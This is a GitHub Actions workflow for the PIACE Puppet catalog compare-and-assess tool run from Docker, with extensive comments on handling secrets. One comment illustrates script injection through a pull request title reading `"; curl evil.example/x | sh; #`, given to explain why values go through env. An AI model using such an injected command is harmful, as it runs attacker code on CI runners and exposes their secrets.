# GitHub Actions: compare on every pull request, then assess the result,
# running the published example42/piace image instead of downloading the
# binary.
#
# This is the docker twin of github-actions.yml. Copy to
# .github/workflows/piace.yml in your control repository, with the layout
# docs/ci.md describes:
#
#   ci/piace/targets.yaml            committed, reviewable policy
#   ci/piace/services.yaml.tmpl      committed, rendered per job
#   ci/piace/services-explain.yaml   committed, inference only
#   ci/piace/policy-notes.md         committed, site policy for the model
#   ci/piace/change-context.sh       committed, copied from PIACE's scripts/
#
# Two jobs, not one, because they need different credentials: `compare` holds
# the catalog-reader identity and never sees the inference token, `explain`
# holds the inference token and never sees a private key. A runner compromise
# in either job yields one of the two.
#
# `example42/piace` is distroless: no shell, and its entrypoint is the binary
# itself, so it cannot be the job's `container:` (which expects a shell) and
# `docker run` is the only way to use it. Hosted ubuntu runners ship Docker
# and reach the compiler and PuppetDB from a `run:` step, so this runs
# unmodified there. Pin the tag: `:${PIACE_VERSION}` follows the release the
# same way the binary's checksum does.

name: piace

on:
  pull_request:

# The workflow reads the checkout and nothing else. Neither job writes to the
# repository.
permissions:
  contents: read

env:
  PIACE_VERSION: '0.2.1'

jobs:
  compare:
    runs-on: ubuntu-latest
    # A pull request from a fork gets no secrets, so the job would fail at TLS
    # load with exit 30 rather than doing anything useful. Skip it instead of
    # producing a red run nobody can fix. Never reach for `pull_request_target`
    # to work around this: it hands the secrets to code the fork controls.
    if: github.event.pull_request.head.repo.full_name == github.repository
    steps:
      - uses: actions/checkout@v4
        with:
          # change-context.sh takes a merge base, which a shallow clone does
          # not have.
          fetch-depth: 0

      # $RUNNER_TEMP is per-job and outside the checkout, which is what makes
      # it the right home for a private key: nothing here reaches actions/cache,
      # an uploaded artifact, or a later `git status`. The container mounts it
      # read-only at /run/piace, so the services file is rendered with
      # @PIACE_RUN@ pointing at the container path, not the host one.
      #
      # No `set -x` in this step, ever. The secrets themselves are never
      # echoed; a trace of the commands that write them would be.
      - name: Render the services file and write the catalog-reader identity
        env:
          PIACE_CA_BUNDLE: ${{ secrets.PIACE_CA_BUNDLE }}
          PIACE_CLIENT_CERT: ${{ secrets.PIACE_CLIENT_CERT }}
          PIACE_PRIVATE_KEY: ${{ secrets.PIACE_PRIVATE_KEY }}
        run: |
          set -euo pipefail
          umask 077
          install -d -m 0700 "$RUNNER_TEMP/piace-run"
          printf '%s\n' "$PIACE_CA_BUNDLE"   > "$RUNNER_TEMP/piace-run/ca.pem"
          printf '%s\n' "$PIACE_CLIENT_CERT" > "$RUNNER_TEMP/piace-run/client.pem"
          printf '%s\n' "$PIACE_PRIVATE_KEY" > "$RUNNER_TEMP/piace-run/client.key"
          sed "s|@PIACE_RUN@|/run/piace|g" ci/piace/services.yaml.tmpl \
            > "$RUNNER_TEMP/piace-run/services.yaml"

      # Exit 10 is a policy difference, which fails the step and so the job:
      # that is `fail_on_diff: true` in targets.yaml doing its work. 20 and 30
      # mean the run did not complete. `docker run` returns the container's
      # exit code, so the gate reaches GitHub unchanged. To review differences
      # without blocking the pull request, set `fail_on_diff: false` rather
      # than swallowing the exit code here, so the report still says what
      # changed.
      #
      # The candidate environment is the one this workflow deployed: a
      # per-run value, passed at the invocation so the committed target file
      # stays reviewable policy and the job never rewrites it. It overrides
      # candidate.environment for every target, so the file may omit the
      # field entirely. The environment maps to the compiler by branch name:
      # the head ref of this pull request is the Puppet environment the
      # compiler has deployed, so use the head ref, not the pull request
      # number. A branch name is not always a Puppet environment name:
      # environments cannot contain a dash, and r10k, when configured to,
      # deploys `feature-x` as `feature_x`. Rewrite dashes the same way so
      # the requested environment equals the one deployed; match whatever
      # mapping your deploy step applies, not one invented here. It arrives
      # through `env:` for the reason the change context step below explains.
      #
      # The container's working directory is /work, where the checkout is
      # mounted, so `--targets ci/piace/targets.yaml` resolves and the
      # reports land back in the checkout. `--user` maps the runner's uid so
      # the non-root image can write into the mount. Every path piace reads
      # resolves inside the container, not on the runner.
      - name: Compare
        env:
          HEAD_REF: ${{ github.head_ref }}
        run: |
          set -euo pipefail
          candidate_environment="${HEAD_REF//-/_}"
          docker run --rm \
            --user "$(id -u):$(id -g)" \
            --volume "$PWD:/work" \
            --volume "$RUNNER_TEMP/piace-run:/run/piace:ro" \
            "example42/piace:${PIACE_VERSION}" \
            compare --targets ci/piace/targets.yaml \
                    --services /run/piace/services.yaml \
                    --candidate-environment "$candidate_environment" \
                    --json-out report.json \
                    --html-out report.html

      # Both reports carry catalog values, redacted per targets.yaml but not
      # otherwise sanitized. Keep the retention short and remember that anyone
      # who can read the repository can download them.
      - name: Upload the reports
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: piace-report
          path: |
            report.json
            report.html
          retention-days: 5
          if-no-files-found: warn

      # A hosted runner is destroyed after the job and a self-hosted one is
      # not. This step costs nothing on the first and matters on the second.
      - name: Remove the identity
        if: always()
        run: rm -rf "$RUNNER_TEMP/piace-run"

  explain:
    needs: compare
    runs-on: ubuntu-latest
    # `always()` on purpose: the run worth assessing is usually the one that
    # just failed the gate. `compare` writes report.json before it exits 10.
    if: always() && needs.compare.result != 'skipped'
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      # GitHub has no per-exit-code handling, so `compare` fails its job on
      # 10, 20 and 30 alike and this job cannot tell them apart from
      # needs.compare.result. Whether a result document was produced is the
      # honest proxy: exit 10 wrote one, exit 30 usually did not.
      - name: Download the reports
        id: reports
        continue-on-error: true
        uses: actions/download-artifact@v4
        with:
          name: piace-report

      # PIACE never invokes git. This script does, in the checkout, on the
      # runner: commit subjects and changed paths only, never bodies. Read
      # examples/change-context.yaml before enabling it. Everything in the
      # generated file is forwarded to the inference service as data, and the
      # change context is not pseudonymized.
      #
      # Every value below arrives through `env:`, never through `${{ }}` inside
      # the run block. `${{ }}` is substituted into the script text before a
      # shell sees it, so a pull request titled `"; curl evil.example/x | sh; #`
      # would run on this runner, and a pull request title is attacker-supplied
      # by definition. The base ref goes the same way: a git branch name may
      # legally contain `;`, `$` and a backtick.
      #
      # The generator stops at commit subjects and changed paths. Title and
      # description belong to the pull request, which git does not have, and
      # without them the model never learns what the change is for. A literal
      # block scalar because a body is multi-line and a title contains colons.
      - name: Describe the change
        if: steps.reports.outcome == 'success'
        env:
          BASE_REF: ${{ github.base_ref }}
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_BODY: ${{ github.event.pull_request.body }}
        run: |
          ci/piace/change-context.sh "origin/$BASE_REF" HEAD > change-context.yaml
          {
            printf '  title: |\n'
            printf '%s\n' "$PR_TITLE" | sed 's/^/    /'
            printf '  description: |\n'
            printf '%s\n' "$PR_BODY"  | sed 's/^/    /'
          } >> change-context.yaml

      # The token is referenced by name; there is no field that inlines one.
      # `explain` cannot change an exit code, so a failure here is advisory
      # unless you pass --fail-on-inference-error. `--env NAME` inherits the
      # value from the step environment into the container without it ever
      # appearing in a command line.
      - name: Assess
        if: steps.reports.outcome == 'success'
        env:
          PIACE_INFERENCE_TOKEN: ${{ secrets.PIACE_INFERENCE_TOKEN }}
        run: |
          set -euo pipefail
          docker run --rm \
            --env PIACE_INFERENCE_TOKEN \
            --user "$(id -u):$(id -g)" \
            --volume "$PWD:/work" \
            "example42/piace:${PIACE_VERSION}" \
            explain --json-in report.json \
                    --services ci/piace/services-explain.yaml \
                    --change change-context.yaml \
                    --ai-out assessment.json \
                    --html-out report.html

      - name: Upload the assessment
        if: always() && steps.reports.outcome == 'success'
        uses: actions/upload-artifact@v4
        with:
          name: piace-assessment
          path: |
            assessment.json
            report.html
          retention-days: 5
          if-no-files-found: warn